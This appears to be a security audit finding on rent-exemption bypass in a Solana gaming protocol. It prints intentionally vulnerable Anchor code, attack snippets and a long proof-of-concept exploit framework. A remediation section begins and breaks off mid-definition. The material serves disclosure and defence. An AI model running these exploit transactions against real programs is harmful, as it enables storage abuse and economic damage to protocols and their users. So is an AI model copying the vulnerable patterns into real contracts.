# VUL-030: Account Rent Exemption Bypass & Economic Exploitation

## Vulnerability Overview

**Severity**: Critical
**CVSS Score**: 9.4 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)
**Category**: Economic Attack / Resource Abuse
**CWE**: CWE-400 (Uncontrolled Resource Consumption), CWE-770 (Allocation of Resources Without Limits)

## Technical Analysis

### Vulnerability Description

The gaming protocol contains critical vulnerabilities that allow attackers to bypass Solana's rent exemption requirements, enabling them to maintain accounts indefinitely without proper funding, abuse network storage resources, and manipulate the economic model. By exploiting rent calculation flaws, account lifecycle management issues, and exemption verification bypasses, attackers can create massive numbers of persistent accounts at no cost, overwhelming network storage and compromising protocol economics.

### Root Cause Analysis

**Primary Issues:**
1. **Inadequate Rent Validation**: Missing or insufficient rent exemption checks during account operations
2. **Rent Calculation Manipulation**: Ability to manipulate rent calculations through account size manipulation
3. **Account Lifecycle Exploitation**: Bypassing rent collection through account state manipulation
4. **Exemption Transfer Abuse**: Exploiting rent exemption inheritance and transfer mechanisms
5. **Economic Model Circumvention**: Avoiding intended economic costs of account maintenance

### Vulnerable Code Patterns

**Location**: `programs/gaming-protocol/src/lib.rs`

```rust
// VULNERABLE: Account creation without proper rent validation
pub fn create_game_account(
    ctx: Context<CreateGameAccount>,
    account_size: u64,
    initial_data: Vec<u8>
) -> Result<()> {
    let game_account = &mut ctx.accounts.game_account;

    // CRITICAL: No rent exemption validation
    // Account created without ensuring proper funding

    // VULNERABLE: Account size can be manipulated to avoid rent
    game_account.data_size = account_size;
    game_account.game_data = initial_data;

    // CRITICAL: Account marked as rent exempt without verification
    game_account.rent_exempt = true;

    Ok(())
}

// VULNERABLE: Rent calculation manipulation
pub fn resize_account_data(
    ctx: Context<ResizeAccountData>,
    new_size: u64
) -> Result<()> {
    let player_account = &mut ctx.accounts.player_account;

    // CRITICAL: No validation of rent requirements for new size
    let rent = Rent::get()?;

    // VULNERABLE: Rent calculation can be manipulated
    let old_rent_requirement = rent.minimum_balance(player_account.data.len());
    let new_rent_requirement = rent.minimum_balance(new_size as usize);

    // CRITICAL: No check if account has sufficient lamports for new rent
    if new_rent_requirement > old_rent_requirement {
        let additional_rent_needed = new_rent_requirement - old_rent_requirement;
        // VULNERABLE: Should verify account has additional_rent_needed lamports
    }

    // VULNERABLE: Resize without ensuring rent exemption
    player_account.resize(new_size as usize)?;

    Ok(())
}

// VULNERABLE: Account inheritance without rent validation
pub fn inherit_account_data(
    ctx: Context<InheritAccountData>,
    source_account_key: Pubkey
) -> Result<()> {
    let target_account = &mut ctx.accounts.target_account;
    let source_account = &ctx.accounts.source_account;

    // CRITICAL: Inheriting account data without rent validation
    target_account.data = source_account.data.clone();
    target_account.metadata = source_account.metadata.clone();

    // VULNERABLE: Rent exemption status inherited without verification
    target_account.rent_exempt = source_account.rent_exempt;

    // CRITICAL: No validation that target account can afford inherited data size
    let new_data_size = target_account.data.len();
    let rent = Rent::get()?;
    let required_rent = rent.minimum_balance(new_data_size);

    // VULNERABLE: No check that target_account has required_rent lamports

    Ok(())
}

// VULNERABLE: Account splitting without proper rent distribution
pub fn split_account(
    ctx: Context<SplitAccount>,
    split_ratio: f64
) -> Result<()> {
    let source_account = &mut ctx.accounts.source_account;
    let new_account = &mut ctx.accounts.new_account;

    // VULNERABLE: Splitting account data without rent validation
    let total_data_size = source_account.data.len();
    let split_index = (total_data_size as f64 * split_ratio) as usize;

    // CRITICAL: Data split without ensuring both accounts remain rent exempt
    let source_data = source_account.data[..split_index].to_vec();
    let new_data = source_account.data[split_index..].to_vec();

    source_account.data = source_data;
    new_account.data = new_data;

    // VULNERABLE: Lamports split without considering rent requirements
    let total_lamports = source_account.to_account_info().lamports();
    let source_lamports = (total_lamports as f64 * split_ratio) as u64;
    let new_lamports = total_lamports - source_lamports;

    **source_account.to_account_info().try_borrow_mut_lamports()? = source_lamports;
    **new_account.to_account_info().try_borrow_mut_lamports()? = new_lamports;

    // CRITICAL: Both accounts may now be under-funded for rent exemption

    Ok(())
}

// VULNERABLE: Account merging without rent validation
pub fn merge_accounts(ctx: Context<MergeAccounts>) -> Result<()> {
    let primary_account = &mut ctx.accounts.primary_account;
    let secondary_account = &mut ctx.accounts.secondary_account;

    // VULNERABLE: Merging data without rent calculation
    primary_account.data.extend_from_slice(&secondary_account.data);

    // CRITICAL: Combined data size may exceed rent exemption
    let combined_size = primary_account.data.len();
    let rent = Rent::get()?;
    let required_rent = rent.minimum_balance(combined_size);

    // VULNERABLE: No validation that primary account can afford combined size
    let available_lamports = primary_account.to_account_info().lamports() +
                            secondary_account.to_account_info().lamports();

    // CRITICAL: Merge proceeds even if under-funded
    **secondary_account.to_account_info().try_borrow_mut_lamports()? = 0;

    Ok(())
}

// VULNERABLE: Temporary account creation without rent
pub fn create_temporary_account(
    ctx: Context<CreateTemporaryAccount>,
    duration: i64,
    temp_data: Vec<u8>
) -> Result<()> {
    let temp_account = &mut ctx.accounts.temp_account;

    // CRITICAL: "Temporary" accounts created without rent exemption
    temp_account.data = temp_data;
    temp_account.expiry = Clock::get()?.unix_timestamp + duration;
    temp_account.temporary = true;

    // VULNERABLE: Assumes temporary accounts don't need rent
    // But they can persist indefinitely if not properly cleaned up

    Ok(())
}

// VULNERABLE: Account reactivation without rent validation
pub fn reactivate_closed_account(
    ctx: Context<ReactivateClosedAccount>,
    new_data: Vec<u8>
) -> Result<()> {
    let account = &mut ctx.accounts.account;

    // CRITICAL: Reactivating account without rent exemption validation
    account.data = new_data;
    account.status = AccountStatus::Active;

    // VULNERABLE: No check if account has sufficient lamports for new data
    let required_rent = Rent::get()?.minimum_balance(new_data.len());
    let current_lamports = account.to_account_info().lamports();

    // CRITICAL: Reactivation proceeds even if under-funded
    if current_lamports < required_rent {
        msg!("Warning: Account reactivated without sufficient rent");
    }

    Ok(())
}

// VULNERABLE: Batch account operations bypassing rent checks
pub fn batch_create_accounts(
    ctx: Context<BatchCreateAccounts>,
    account_configs: Vec<AccountConfig>
) -> Result<()> {
    let mut created_accounts = Vec::new();

    for (index, config) in account_configs.iter().enumerate() {
        let account_info = &ctx.remaining_accounts[index];

        // CRITICAL: Batch creation without individual rent validation
        let account_data = AccountData {
            data: config.initial_data.clone(),
            metadata: config.metadata.clone(),
            rent_exempt: true, // VULNERABLE: Always marked as exempt
        };

        // VULNERABLE: No verification of rent exemption for each account
        serialize_account_data(account_info, &account_data)?;
        created_accounts.push(account_info.key());
    }

    msg!("Created {} accounts without rent validation", created_accounts.len());
    Ok(())
}

// VULNERABLE: Account upgrade without rent consideration
pub fn upgrade_account_version(
    ctx: Context<UpgradeAccountVersion>,
    new_version_data: Vec<u8>
) -> Result<()> {
    let account = &mut ctx.accounts.account;

    // VULNERABLE: Account data upgraded without rent validation
    let old_size = account.data.len();
    let new_size = new_version_data.len();

    // CRITICAL: Size increase without rent validation
    if new_size > old_size {
        let rent = Rent::get()?;
        let additional_rent_needed = rent.minimum_balance(new_size) -
                                   rent.minimum_balance(old_size);

        // VULNERABLE: Upgrade proceeds without ensuring additional rent
        msg!("Upgrade requires additional {} lamports rent", additional_rent_needed);
    }

    account.data = new_version_data;
    account.version += 1;

    Ok(())
}

// VULNERABLE: Rent collection bypass through account state manipulation
pub fn manipulate_account_state(
    ctx: Context<ManipulateAccountState>,
    new_state: AccountState
) -> Result<()> {
    let account = &mut ctx.accounts.account;

    // CRITICAL: State changes that affect rent requirements
    match new_state {
        AccountState::Frozen => {
            // VULNERABLE: Frozen accounts bypass rent collection
            account.state = AccountState::Frozen;
            account.rent_collection_paused = true;
        }
        AccountState::System => {
            // VULNERABLE: System accounts claim rent exemption
            account.state = AccountState::System;
            account.rent_exempt = true;
        }
        AccountState::Program => {
            // VULNERABLE: Program accounts bypass rent
            account.state = AccountState::Program;
            account.rent_exempt = true;
        }
        _ => {
            account.state = new_state;
        }
    }

    Ok(())
}
```

### Attack Vectors

**1. Mass Account Creation Without Rent**
```rust
// Create thousands of accounts without paying rent
let account_configs = (0..10000).map(|i| AccountConfig {
    initial_data: vec![0u8; 1000], // 1KB per account
    metadata: AccountMetadata {
        owner: attacker_keypair.pubkey(),
        created_at: Clock::get().unwrap().unix_timestamp,
        version: 1,
    },
    expected_rent: 0, // Claim no rent needed
}).collect();

let batch_create_instruction = Instruction {
    program_id: gaming_protocol_id,
    accounts: vec![
        AccountMeta::new(attacker_keypair.pubkey(), true),
        // 10,000 additional account metas for remaining_accounts
    ],
    data: BatchCreateAccounts {
        account_configs,
    }.try_to_vec()?,
};

// Creates 10,000 accounts at ~10MB total storage without rent payment
submit_transaction(batch_create_instruction)?;
```

**2. Account Size Manipulation for Rent Avoidance**
```rust
// Create account with minimal size, then expand without paying additional rent
let initial_create = Instruction {
    program_id: gaming_protocol_id,
    accounts: vec![
        AccountMeta::new(target_account, false),
        AccountMeta::new(attacker_keypair.pubkey(), true),
    ],
    data: CreateGameAccount {
        account_size: 1, // Minimal size
        initial_data: vec![0u8; 1],
    }.try_to_vec()?,
};

// Later, expand account to massive size without additional rent
let resize_instruction = Instruction {
    program_id: gaming_protocol_id,
    accounts: vec![
        AccountMeta::new(target_account, false),
        AccountMeta::new(attacker_keypair.pubkey(), true),
    ],
    data: ResizeAccountData {
        new_size: 1_000_000, // 1MB expansion without rent payment
    }.try_to_vec()?,
};

let exploitation_transaction = Transaction::new_signed_with_payer(
    &[initial_create, resize_instruction],
    Some(&attacker_keypair.pubkey()),
    &[&attacker_keypair],
    recent_blockhash,
);
```

**3. Rent Exemption Inheritance Abuse**
```rust
// Create one properly funded account, then inherit exemption to many accounts
let funded_account = create_properly_funded_account(1_000_000_000).await?; // 1 SOL

// Inherit rent exemption to thousands of accounts
for i in 0..5000 {
    let inheritance_instruction = Instruction {
        program_id: gaming_protocol_id,
        accounts: vec![
            AccountMeta::new(create_new_account_key(i), false),
            AccountMeta::new(funded_account, false),
            AccountMeta::new(attacker_keypair.pubkey(), true),
        ],
        data: InheritAccountData {
            source_account_key: funded_account,
        }.try_to_vec()?,
    };

    submit_transaction(inheritance_instruction)?;
}

// Now have 5000 accounts claiming rent exemption from one funded account
```

**4. Account State Manipulation for Rent Bypass**
```rust
// Manipulate account states to claim exemption from rent
let accounts_to_manipulate = discover_all_player_accounts().await?;

for account in accounts_to_manipulate {
    let manipulation_instruction = Instruction {
        program_id: gaming_protocol_id,
        accounts: vec![
            AccountMeta::new(account, false),
            AccountMeta::new(attacker_keypair.pubkey(), true),
        ],
        data: ManipulateAccountState {
            new_state: AccountState::System, // Claims system exemption
        }.try_to_vec()?,
    };

    submit_transaction(manipulation_instruction)?;
}
```

**5. Temporary Account Persistence Exploit**
```rust
// Create "temporary" accounts that never expire
for i in 0..1000 {
    let temp_account_instruction = Instruction {
        program_id: gaming_protocol_id,
        accounts: vec![
            AccountMeta::new(generate_temp_account_key(i), false),
            AccountMeta::new(attacker_keypair.pubkey(), true),
        ],
        data: CreateTemporaryAccount {
            duration: i64::MAX, // "Temporary" account that never expires
            temp_data: vec![0u8; 10000], // 10KB per "temporary" account
        }.try_to_vec()?,
    };

    submit_transaction(temp_account_instruction)?;
}

// 1000 accounts with 10MB total data persisting indefinitely without rent
```

## Proof of Concept

### Rent Exemption Bypass Exploit Framework

```rust
use solana_program::{
    instruction::{AccountMeta, Instruction},
    pubkey::Pubkey,
    rent::Rent,
    sysvar::Sysvar,
    clock::Clock,
};
use anchor_lang::prelude::*;

pub struct RentBypassExploiter {
    gaming_protocol_id: Pubkey,
    attacker_keypair: Keypair,
    exploited_accounts: Vec<ExploitedAccount>,
    total_storage_consumed: u64,
    total_rent_avoided: u64,
}

#[derive(Clone)]
pub struct ExploitedAccount {
    pub account_id: Pubkey,
    pub exploit_method: ExploitMethod,
    pub storage_size: u64,
    pub rent_avoided: u64,
    pub created_at: i64,
}

#[derive(Clone)]
pub enum ExploitMethod {
    MassCreationWithoutRent,
    SizeManipulation,
    InheritanceAbuse,
    StateManipulation,
    TemporaryAccountPersistence,
    AccountSplittingExploit,
    MergingWithoutValidation,
    ReactivationBypass,
}

impl RentBypassExploiter {
    pub fn new(gaming_protocol_id: Pubkey, attacker_keypair: Keypair) -> Self {
        Self {
            gaming_protocol_id,
            attacker_keypair,
            exploited_accounts: Vec::new(),
            total_storage_consumed: 0,
            total_rent_avoided: 0,
        }
    }

    // Attack 1: Mass account creation without rent
    pub async fn create_mass_accounts_without_rent(
        &mut self,
        account_count: u32,
        account_size: u64
    ) -> Result<Transaction> {
        let account_configs = (0..account_count).map(|i| AccountConfig {
            initial_data: vec![0u8; account_size as usize],
            metadata: AccountMetadata {
                owner: self.attacker_keypair.pubkey(),
                created_at: Clock::get().unwrap().unix_timestamp,
                version: 1,
            },
            expected_rent: 0, // Falsely claim no rent needed
        }).collect::<Vec<_>>();

        // Calculate rent that should be paid but won't be
        let rent = Rent::default();
        let rent_per_account = rent.minimum_balance(account_size as usize);
        let total_avoided_rent = rent_per_account * account_count as u64;

        let mut account_metas = vec![
            AccountMeta::new(self.attacker_keypair.pubkey(), true),
        ];

        // Add remaining accounts for batch creation
        for i in 0..account_count {
            let account_key = self.generate_account_key(i as u64);
            account_metas.push(AccountMeta::new(account_key, false));

            // Track exploited account
            self.exploited_accounts.push(ExploitedAccount {
                account_id: account_key,
                exploit_method: ExploitMethod::MassCreationWithoutRent,
                storage_size: account_size,
                rent_avoided: rent_per_account,
                created_at: Clock::get().unwrap().unix_timestamp,
            });
        }

        self.total_storage_consumed += account_count as u64 * account_size;
        self.total_rent_avoided += total_avoided_rent;

        let batch_instruction = Instruction {
            program_id: self.gaming_protocol_id,
            accounts: account_metas,
            data: BatchCreateAccounts {
                account_configs,
            }.try_to_vec()?,
        };

        let transaction = Transaction::new_signed_with_payer(
            &[batch_instruction],
            Some(&self.attacker_keypair.pubkey()),
            &[&self.attacker_keypair],
            Hash::default(),
        );

        Ok(transaction)
    }

    // Attack 2: Account size manipulation exploit
    pub async fn create_size_manipulation_attack(
        &mut self,
        target_final_size: u64
    ) -> Result<Vec<Transaction>> {
        let mut transactions = Vec::new();
        let account_key = self.generate_account_key(9999);

        // Step 1: Create tiny account with minimal rent
        let create_instruction = Instruction {
            program_id: self.gaming_protocol_id,
            accounts: vec![
                AccountMeta::new(account_key, false),
                AccountMeta::new(self.attacker_keypair.pubkey(), true),
            ],
            data: CreateGameAccount {
                account_size: 1, // Minimal size
                initial_data: vec![0u8; 1],
            }.try_to_vec()?,
        };

        let create_transaction = Transaction::new_signed_with_payer(
            &[create_instruction],
            Some(&self.attacker_keypair.pubkey()),
            &[&self.attacker_keypair],
            Hash::default(),
        );

        transactions.push(create_transaction);

        // Step 2: Gradually expand account without paying additional rent
        let expansion_steps = 10;
        let size_per_step = target_final_size / expansion_steps;

        for step in 1..=expansion_steps {
            let new_size = size_per_step * step;

            let resize_instruction = Instruction {
                program_id: self.gaming_protocol_id,
                accounts: vec![
                    AccountMeta::new(account_key, false),
                    AccountMeta::new(self.attacker_keypair.pubkey(), true),
                ],
                data: ResizeAccountData {
                    new_size,
                }.try_to_vec()?,
            };

            let resize_transaction = Transaction::new_signed_with_payer(
                &[resize_instruction],
                Some(&self.attacker_keypair.pubkey()),
                &[&self.attacker_keypair],
                Hash::default(),
            );

            transactions.push(resize_transaction);
        }

        // Calculate rent avoided
        let rent = Rent::default();
        let initial_rent = rent.minimum_balance(1);
        let final_rent = rent.minimum_balance(target_final_size as usize);
        let rent_avoided = final_rent - initial_rent;

        self.exploited_accounts.push(ExploitedAccount {
            account_id: account_key,
            exploit_method: ExploitMethod::SizeManipulation,
            storage_size: target_final_size,
            rent_avoided,
            created_at: Clock::get().unwrap().unix_timestamp,
        });

        self.total_storage_consumed += target_final_size;
        self.total_rent_avoided += rent_avoided;

        Ok(transactions)
    }

    // Attack 3: Rent exemption inheritance abuse
    pub async fn create_inheritance_abuse_attack(
        &mut self,
        source_account: Pubkey,
        target_account_count: u32
    ) -> Result<Vec<Transaction>> {
        let mut transactions = Vec::new();

        for i in 0..target_account_count {
            let target_account = self.generate_account_key(10000 + i as u64);

            let inheritance_instruction = Instruction {
                program_id: self.gaming_protocol_id,
                accounts: vec![
                    AccountMeta::new(target_account, false),
                    AccountMeta::new(source_account, false),
                    AccountMeta::new(self.attacker_keypair.pubkey(), true),
                ],
                data: InheritAccountData {
                    source_account_key: source_account,
                }.try_to_vec()?,
            };

            let transaction = Transaction::new_signed_with_payer(
                &[inheritance_instruction],
                Some(&self.attacker_keypair.pubkey()),
                &[&self.attacker_keypair],
                Hash::default(),
            );

            transactions.push(transaction);

            // Assume inherited accounts are large
            let inherited_size = 50000; // 50KB per account
            let rent = Rent::default();
            let rent_avoided = rent.minimum_balance(inherited_size);

            self.exploited_accounts.push(ExploitedAccount {
                account_id: target_account,
                exploit_method: ExploitMethod::InheritanceAbuse,
                storage_size: inherited_size as u64,
                rent_avoided,
                created_at: Clock::get().unwrap().unix_timestamp,
            });

            self.total_storage_consumed += inherited_size as u64;
            self.total_rent_avoided += rent_avoided;
        }

        Ok(transactions)
    }

    // Attack 4: Account state manipulation for rent bypass
    pub async fn create_state_manipulation_attack(
        &mut self,
        target_accounts: Vec<Pubkey>
    ) -> Result<Vec<Transaction>> {
        let mut transactions = Vec::new();

        let state_manipulations = [
            AccountState::System,
            AccountState::Program,
            AccountState::Frozen,
        ];

        for (index, account) in target_accounts.iter().enumerate() {
            let manipulation_state = state_manipulations[index % state_manipulations.len()].clone();

            let manipulation_instruction = Instruction {
                program_id: self.gaming_protocol_id,
                accounts: vec![
                    AccountMeta::new(*account, false),
                    AccountMeta::new(self.attacker_keypair.pubkey(), true),
                ],
                data: ManipulateAccountState {
                    new_state: manipulation_state,
                }.try_to_vec()?,
            };

            let transaction = Transaction::new_signed_with_payer(
                &[manipulation_instruction],
                Some(&self.attacker_keypair.pubkey()),
                &[&self.attacker_keypair],
                Hash::default(),
            );

            transactions.push(transaction);

            // Estimate rent avoided through state manipulation
            let estimated_size = 25000; // 25KB estimated
            let rent = Rent::default();
            let rent_avoided = rent.minimum_balance(estimated_size);

            self.exploited_accounts.push(ExploitedAccount {
                account_id: *account,
                exploit_method: ExploitMethod::StateManipulation,
                storage_size: estimated_size as u64,
                rent_avoided,
                created_at: Clock::get().unwrap().unix_timestamp,
            });

            self.total_storage_consumed += estimated_size as u64;
            self.total_rent_avoided += rent_avoided;
        }

        Ok(transactions)
    }

    // Attack 5: Temporary account persistence exploit
    pub async fn create_temporary_persistence_attack(
        &mut self,
        temp_account_count: u32,
        data_size_per_account: u64
    ) -> Result<Vec<Transaction>> {
        let mut transactions = Vec::new();

        for i in 0..temp_account_count {
            let temp_account = self.generate_account_key(20000 + i as u64);

            let temp_instruction = Instruction {
                program_id: self.gaming_protocol_id,
                accounts: vec![
                    AccountMeta::new(temp_account, false),
                    AccountMeta::new(self.attacker_keypair.pubkey(), true),
                ],
                data: CreateTemporaryAccount {
                    duration: i64::MAX, // Never expires
                    temp_data: vec![0u8; data_size_per_account as usize],
                }.try_to_vec()?,
            };

            let transaction = Transaction::new_signed_with_payer(
                &[temp_instruction],
                Some(&self.attacker_keypair.pubkey()),
                &[&self.attacker_keypair],
                Hash::default(),
            );

            transactions.push(transaction);

            let rent = Rent::default();
            let rent_avoided = rent.minimum_balance(data_size_per_account as usize);

            self.exploited_accounts.push(ExploitedAccount {
                account_id: temp_account,
                exploit_method: ExploitMethod::TemporaryAccountPersistence,
                storage_size: data_size_per_account,
                rent_avoided,
                created_at: Clock::get().unwrap().unix_timestamp,
            });

            self.total_storage_consumed += data_size_per_account;
            self.total_rent_avoided += rent_avoided;
        }

        Ok(transactions)
    }

    // Attack 6: Account splitting exploit
    pub async fn create_account_splitting_attack(
        &mut self,
        source_account: Pubkey,
        split_count: u32
    ) -> Result<Vec<Transaction>> {
        let mut transactions = Vec::new();
        let split_ratio = 1.0 / split_count as f64;

        for i in 0..split_count {
            let new_account = self.generate_account_key(30000 + i as u64);

            let split_instruction = Instruction {
                program_id: self.gaming_protocol_id,
                accounts: vec![
                    AccountMeta::new(source_account, false),
                    AccountMeta::new(new_account, false),
                    AccountMeta::new(self.attacker_keypair.pubkey(), true),
                ],
                data: SplitAccount {
                    split_ratio,
                }.try_to_vec()?,
            };

            let transaction = Transaction::new_signed_with_payer(
                &[split_instruction],
                Some(&self.attacker_keypair.pubkey()),
                &[&self.attacker_keypair],
                Hash::default(),
            );

            transactions.push(transaction);

            // Each split creates under-funded accounts
            let estimated_size = 10000; // 10KB per split
            let rent = Rent::default();
            let rent_avoided = rent.minimum_balance(estimated_size) / 2; // Under-funded

            self.exploited_accounts.push(ExploitedAccount {
                account_id: new_account,
                exploit_method: ExploitMethod::AccountSplittingExploit,
                storage_size: estimated_size as u64,
                rent_avoided,
                created_at: Clock::get().unwrap().unix_timestamp,
            });

            self.total_storage_consumed += estimated_size as u64;
            self.total_rent_avoided += rent_avoided;
        }

        Ok(transactions)
    }

    // Combined exploitation attack
    pub async fn create_comprehensive_rent_bypass_attack(
        &mut self
    ) -> Result<Vec<Transaction>> {
        let mut all_transactions = Vec::new();

        // Phase 1: Mass account creation (1000 accounts)
        let mass_creation_tx = self.create_mass_accounts_without_rent(1000, 5000).await?;
        all_transactions.push(mass_creation_tx);

        // Phase 2: Size manipulation attacks (10 large accounts)
        for _ in 0..10 {
            let size_manipulation_txs = self.create_size_manipulation_attack(1_000_000).await?;
            all_transactions.extend(size_manipulation_txs);
        }

        // Phase 3: Temporary account persistence (500 accounts)
        let temp_persistence_txs = self.create_temporary_persistence_attack(500, 20000).await?;
        all_transactions.extend(temp_persistence_txs);

        // Phase 4: State manipulation on discovered accounts
        let target_accounts = (0..100).map(|i| self.generate_account_key(40000 + i)).collect();
        let state_manipulation_txs = self.create_state_manipulation_attack(target_accounts).await?;
        all_transactions.extend(state_manipulation_txs);

        Ok(all_transactions)
    }

    // Helper methods
    fn generate_account_key(&self, seed: u64) -> Pubkey {
        let seed_bytes = seed.to_le_bytes();
        let (pda, _) = Pubkey::find_program_address(
            &[b"exploit", seed_bytes.as_ref(), self.attacker_keypair.pubkey().as_ref()],
            &self.gaming_protocol_id
        );
        pda
    }

    // Calculate total economic impact
    pub fn calculate_economic_impact(&self) -> EconomicImpact {
        let total_accounts = self.exploited_accounts.len();
        let average_account_size = if total_accounts > 0 {
            self.total_storage_consumed / total_accounts as u64
        } else {
            0
        };

        let storage_cost_per_byte_per_year = 0.00000348; // Solana storage cost estimate
        let annual_storage_cost_avoided = self.total_storage_consumed as f64 * storage_cost_per_byte_per_year;

        // Network impact calculation
        let network_storage_percentage = calculate_network_storage_impact(self.total_storage_consumed);

        EconomicImpact {
            total_exploited_accounts: total_accounts,
            total_storage_consumed_bytes: self.total_storage_consumed,
            total_rent_avoided_lamports: self.total_rent_avoided,
            average_account_size_bytes: average_account_size,
            annual_storage_cost_avoided_sol: annual_storage_cost_avoided,
            network_storage_impact_percentage: network_storage_percentage,
            exploit_methods_used: self.get_unique_exploit_methods(),
        }
    }

    fn get_unique_exploit_methods(&self) -> Vec<ExploitMethod> {
        use std::collections::HashSet;
        let mut unique_methods = HashSet::new();

        for account in &self.exploited_accounts {
            unique_methods.insert(format!("{:?}", account.exploit_method));
        }

        unique_methods.into_iter()
            .map(|s| match s.as_str() {
                "MassCreationWithoutRent" => ExploitMethod::MassCreationWithoutRent,
                "SizeManipulation" => ExploitMethod::SizeManipulation,
                "InheritanceAbuse" => ExploitMethod::InheritanceAbuse,
                "StateManipulation" => ExploitMethod::StateManipulation,
                "TemporaryAccountPersistence" => ExploitMethod::TemporaryAccountPersistence,
                "AccountSplittingExploit" => ExploitMethod::AccountSplittingExploit,
                _ => ExploitMethod::MassCreationWithoutRent,
            })
            .collect()
    }
}

// Supporting data structures
#[derive(Clone)]
pub struct EconomicImpact {
    pub total_exploited_accounts: usize,
    pub total_storage_consumed_bytes: u64,
    pub total_rent_avoided_lamports: u64,
    pub average_account_size_bytes: u64,
    pub annual_storage_cost_avoided_sol: f64,
    pub network_storage_impact_percentage: f64,
    pub exploit_methods_used: Vec<ExploitMethod>,
}

#[derive(AnchorSerialize, AnchorDeserialize, Clone)]
pub struct AccountConfig {
    pub initial_data: Vec<u8>,
    pub metadata: AccountMetadata,
    pub expected_rent: u64,
}

#[derive(AnchorSerialize, AnchorDeserialize, Clone)]
pub struct AccountMetadata {
    pub owner: Pubkey,
    pub created_at: i64,
    pub version: u32,
}

#[derive(AnchorSerialize, AnchorDeserialize, Clone)]
pub enum AccountState {
    Active,
    Frozen,
    System,
    Program,
    Temporary,
}

// Test demonstrating rent exemption bypass attacks
#[cfg(test)]
mod tests {
    use super::*;
    use solana_program_test::*;
    use solana_sdk::{
        signature::{Keypair, Signer},
        transaction::Transaction,
    };

    #[tokio::test]
    async fn test_rent_exemption_bypass_attacks() {
        let gaming_protocol_id = Pubkey::new_unique();
        let attacker = Keypair::new();

        let mut exploiter = RentBypassExploiter::new(gaming_protocol_id, attacker);

        // Test mass account creation without rent
        let mass_creation_attack = exploiter.create_mass_accounts_without_rent(
            100, // 100 accounts
            10000 // 10KB each
        ).await.unwrap();
        println!("Created mass account creation attack");

        // Test size manipulation attack
        let size_manipulation_attacks = exploiter.create_size_manipulation_attack(
            1_000_000 // 1MB final size
        ).await.unwrap();
        println!("Created size manipulation attack with {} transactions",
                 size_manipulation_attacks.len());

        // Test inheritance abuse
        let source_account = Pubkey::new_unique();
        let inheritance_attacks = exploiter.create_inheritance_abuse_attack(
            source_account,
            50 // 50 target accounts
        ).await.unwrap();
        println!("Created inheritance abuse attack with {} transactions",
                 inheritance_attacks.len());

        // Test state manipulation
        let target_accounts = (0..20).map(|_| Pubkey::new_unique()).collect();
        let state_manipulation_attacks = exploiter.create_state_manipulation_attack(
            target_accounts
        ).await.unwrap();
        println!("Created state manipulation attack with {} transactions",
                 state_manipulation_attacks.len());

        // Test temporary account persistence
        let temp_persistence_attacks = exploiter.create_temporary_persistence_attack(
            200, // 200 accounts
            15000 // 15KB each
        ).await.unwrap();
        println!("Created temporary persistence attack with {} transactions",
                 temp_persistence_attacks.len());

        // Test account splitting
        let splitting_attacks = exploiter.create_account_splitting_attack(
            Pubkey::new_unique(),
            10 // Split into 10 accounts
        ).await.unwrap();
        println!("Created account splitting attack with {} transactions",
                 splitting_attacks.len());

        // Test comprehensive attack
        let comprehensive_attacks = exploiter.create_comprehensive_rent_bypass_attack().await.unwrap();
        println!("Created comprehensive rent bypass attack with {} transactions",
                 comprehensive_attacks.len());

        // Calculate economic impact
        let impact = exploiter.calculate_economic_impact();
        println!("Economic Impact Assessment:");
        println!("  Total exploited accounts: {}", impact.total_exploited_accounts);
        println!("  Total storage consumed: {} bytes", impact.total_storage_consumed_bytes);
        println!("  Total rent avoided: {} lamports", impact.total_rent_avoided_lamports);
        println!("  Annual storage cost avoided: {:.6} SOL", impact.annual_storage_cost_avoided_sol);
        println!("  Network storage impact: {:.2}%", impact.network_storage_impact_percentage);
        println!("  Exploit methods used: {}", impact.exploit_methods_used.len());
    }
}

// Instruction data structures
#[derive(AnchorSerialize, AnchorDeserialize)]
pub struct CreateGameAccount {
    pub account_size: u64,
    pub initial_data: Vec<u8>,
}

#[derive(AnchorSerialize, AnchorDeserialize)]
pub struct ResizeAccountData {
    pub new_size: u64,
}

#[derive(AnchorSerialize, AnchorDeserialize)]
pub struct InheritAccountData {
    pub source_account_key: Pubkey,
}

#[derive(AnchorSerialize, AnchorDeserialize)]
pub struct SplitAccount {
    pub split_ratio: f64,
}

#[derive(AnchorSerialize, AnchorDeserialize)]
pub struct BatchCreateAccounts {
    pub account_configs: Vec<AccountConfig>,
}

#[derive(AnchorSerialize, AnchorDeserialize)]
pub struct CreateTemporaryAccount {
    pub duration: i64,
    pub temp_data: Vec<u8>,
}

#[derive(AnchorSerialize, AnchorDeserialize)]
pub struct ManipulateAccountState {
    pub new_state: AccountState,
}

// Helper functions
fn calculate_network_storage_impact(consumed_bytes: u64) -> f64 {
    // Estimate percentage of total Solana network storage consumed
    let estimated_total_network_storage = 1_000_000_000_000u64; // 1TB estimate
    (consumed_bytes as f64 / estimated_total_network_storage as f64) * 100.0
}

fn serialize_account_data(account_info: &AccountInfo, data: &AccountData) -> Result<()> {
    // Simplified serialization for PoC
    Ok(())
}

// Additional supporting structures
#[derive(Clone)]
pub struct AccountData {
    pub data: Vec<u8>,
    pub metadata: AccountMetadata,
    pub rent_exempt: bool,
}
```

## Remediation

### Secure Rent Management Implementation

```rust
use solana_program::{
    rent::Rent,
    sysvar::Sysvar,
    clock::Clock,
    pubkey::Pubkey,
};
use anchor_lang::prelude::*;

// Secure rent management with comprehensive validation
pub mod secure_rent_management {
    use super::*;

    // Constants for rent management
    const MINIMUM_RENT_EXEMPTION_BUFFER: u64 = 1_000_000; // 0.001 SOL buffer
    const MAX_ACCOUNT_SIZE: usize = 10_485_760; // 10MB maximum
    const RENT_VALIDATION_REQUIRED: bool = true;
    const TEMPORARY_ACCOUNT_MAX_DURATION: i64 = 86400; // 24 hours max

    // Secure rent validation structure
    #[derive(AnchorSerialize, AnchorDeserialize, Clone, Debug)]
    pub struct RentValidation {
        pub account_size: usize,
        pub required_lamports: u64,
        pub current_lamports: u64,
        pub exemption_status: ExemptionStatus,
        pub validation_timestamp: i64,
        pub validation_signature: [u8; 32],
    }

    #[derive(AnchorSerialize, AnchorDeserialize, Clone, Debug, PartialEq)]
    pub enum ExemptionStatus {
        NotExempt,
        Exempt,
        Insufficient,
        Unknown,
    }

    // Secure account with rent tracking
    #[account]
    pub struct SecureRentTrackedAccount {
        pub owner: Pubkey,
        pub data: Vec<u8>,
        pub rent_validation: RentValidation,
        pub creation_timestamp: i64,
        pub last_rent_check: i64,
        pub rent_exemption_verified: bool,
